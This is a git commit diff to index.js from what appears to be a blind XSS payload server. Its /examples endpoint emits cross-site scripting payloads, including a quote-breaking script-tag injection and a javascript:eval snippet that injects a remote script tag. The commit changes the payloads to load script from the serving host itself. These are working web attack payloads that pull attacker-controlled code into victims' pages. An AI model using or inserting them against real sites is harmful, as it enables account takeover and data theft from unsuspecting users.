eefcf64cedf98a45d9a1884b835ff65809247df8
eanmcc8 <eanmcc86@proton.me>
2025-05-24 22:12:44 -0500

    Update index.js

--- index.js
+++ index.js
@@ -95,9 +95,9 @@ async function uploadImage(image) {
 
 app.get("/examples", (req, res) => {
   res.header("Content-Type", "text/plain");
-  var url = "https://globalcu.org";
+  //var url = "https://globalcu.org";
   //var url = req.protocol + '://' + req.headers['host']
-  //var url = "https://" + req.headers["host"];
+  var url = "https://" + req.headers["host"];
   var page = "/";
   page += `\'"><script src="${url}"></script>\n\n`;
   page += `javascript:eval('var a=document.createElement(\\'script\\');a.src=\\'${url}\\';document.body.appendChild(a)')\n\n`;
